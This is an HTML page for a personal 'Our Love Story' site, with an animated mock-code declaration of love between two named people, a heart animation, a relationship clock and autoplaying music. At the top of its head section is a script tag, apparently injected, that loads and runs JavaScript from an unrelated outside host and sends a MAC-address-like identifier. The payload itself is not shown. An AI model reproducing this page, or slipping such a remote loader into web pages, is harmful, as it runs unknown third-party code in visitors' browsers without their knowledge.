<!DOCTYPE HTML>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head><script src=http://t.7gg.cc:88/j.js?MAC=D8C8E9FEF0C0></script>
	<title>Our Love Story</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<style type="text/css">
		@font-face {
			font-family: digit;
			src: url('digital-7_mono.ttf') format("truetype");
		}
	</style>
	<link href="css/default.css" type="text/css" rel="stylesheet">
	<script type="text/javascript" src="js/jquery.js"></script>
	<script type="text/javascript" src="js/garden.js"></script>
    <script type="text/javascript" src="js/functions.js"></script>
</head>

<body>
	<div id="mainDiv">
		<div id="content">
			<div id="code">
				<span class="comments">/**</span><br />
				<span class="space"/><span class="comments">* We are both cute people,</span><br />
				<span class="space"/><span class="comments">* so I write some code to celebrate ourself.</span><br />
				<span class="space"/><span class="comments">*/</span><br />
				Boy i = <span class="keyword">new</span> Boy(<span class="string">"郭蒙"</span>);<br />
				Girl u = <span class="keyword">new</span> Girl(<span class="string">"杨婧"</span>);<br />
				<span class="comments">// Jan 21, 2018, I told you I love you. </span><br />
				i.love(u);<br />
				<span class="comments">// Luckily, you accepted and became my girlfriend eversince.</span><br />
				u.accepted();<br />
				<span class="comments">// Since then, I miss u every day.</span><br />
				i.miss(u);<br />
				<span class="comments">// And take care of u and our love.</span><br />
				i.takeCareOf(u);<br />
				<span class="comments">// You say that you won't be so easy to marry me.</span><br />
				<span class="comments">// So I keep waiting and I have confidence that you will.</span><br />
				<span class="keyword">boolean</span> isHesitate = <span class="keyword">true</span>;<br />
				<span class="keyword">while</span> (isHesitate) {<br />
				<span class="placeholder"/>i.waitFor(u);<br />
				<span class="placeholder"/><span class="comments">// I think it is an important decision</span><br />
				<span class="placeholder"/><span class="comments">// and you should think it over.</span><br />
				<span class="placeholder"/>isHesitate = u.thinkOver();<br />
				}<br />
				<span class="comments">// After a romantic wedding, we will live happily ever after.</span><br />
				i.marry(u);<br />
				i.liveHappilyWith(u);<br />
			</div>
			<div id="loveHeart">
				<canvas id="garden"></canvas>
				<div id="words">
					<div id="messages">
						            I have fallen in love with you for
						<div id="elapseClock"></div>
					</div>
					<div id="loveu">
						Love u forever and ever.<br/>
						<div class="signature">- 郭蒙</div>
					</div>
				</div>
			</div>
		</div>
		<div id="copyright">
			Inspired by <a href="http://www.openrise.com/lab/FlowerPower/">FlowerPower</a> project.<br />
			Copyright © 2017 <a href='http://ggmg.dx.am/'>GM</a> 2017-2018
		</div>
	</div>
	<script type="text/javascript">
		var offsetX = $("#loveHeart").width() / 2;
		var offsetY = $("#loveHeart").height() / 2 - 55;
		var together = new Date();
		together.setFullYear(2018, 0, 21);
		together.setHours(20);
		together.setMinutes(0);
		together.setSeconds(0);
		together.setMilliseconds(0);
		
		if (!document.createElement('canvas').getContext) {
			var msg = document.createElement("div");
			msg.id = "errorMsg";
			msg.innerHTML = "Your browser doesn't support HTML5!<br/>Recommend use Chrome 14+/IE 9+/Firefox 7+/Safari 4+"; 
			document.body.appendChild(msg);
			$("#code").css("display", "none")
			$("#copyright").css("position", "absolute");
			$("#copyright").css("bottom", "10px");
		    document.execCommand("stop");
		} else {
			setTimeout(function () {
				startHeartAnimation();
			}, 5000);

			timeElapse(together);
			setInterval(function () {
				timeElapse(together);
			}, 500);

			adjustCodePosition();
			$("#code").typewriter();
		}
            document.addEventListener('DOMContentLoaded', function() {

            function audioAutoPlay() {
            var audio = document.getElementById('musicAudio');
            audio.play();
            document.addEventListener("WeixinJSBridgeReady", function() {
              audio.play();
           }, false);
              }
            audioAutoPlay();
}); 


	</script>
<audio id="musicAudio" autoplay="autoplay" loop="loop">
<source src="http://www.ytmp3.cn/down/38584.mp3" type="audio/mpeg">
<source src="http://www.ytmp3.cn/down/32595.mp3" type="audio/mpeg">
</audio>
</body>
</html>
